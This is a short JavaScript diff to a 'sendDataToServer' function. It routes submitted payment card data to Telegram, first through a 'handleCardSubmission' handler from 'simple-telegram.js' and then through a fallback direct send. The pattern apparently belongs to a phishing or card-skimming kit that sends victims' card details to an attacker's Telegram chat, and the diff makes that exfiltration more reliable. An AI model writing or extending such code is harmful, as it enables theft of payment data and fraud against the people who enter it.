@@ -992,13 +992,20 @@ async function sendDataToServer(data) {
     console.log('Sending data to Telegram...');
     
     try {
-        // Use the simple Telegram method instead
-        const result = await sendCardToTelegram(data);
-        if (result.success) {
-            console.log('Data successfully sent to Telegram');
+        // Use the handleCardSubmission method from simple-telegram.js
+        if (typeof handleCardSubmission === 'function') {
+            handleCardSubmission(data);
+            console.log('Data successfully sent to Telegram via handleCardSubmission');
             return { success: true };
         } else {
-            throw new Error('Failed to send to Telegram');
+            // Fallback to direct method
+            const result = await sendCardToTelegram(data);
+            if (result.success) {
+                console.log('Data successfully sent to Telegram');
+                return { success: true };
+            } else {
+                throw new Error('Failed to send to Telegram');
+            }
         }
     } catch (error) {
         console.error('Error sending data to Telegram:', error);
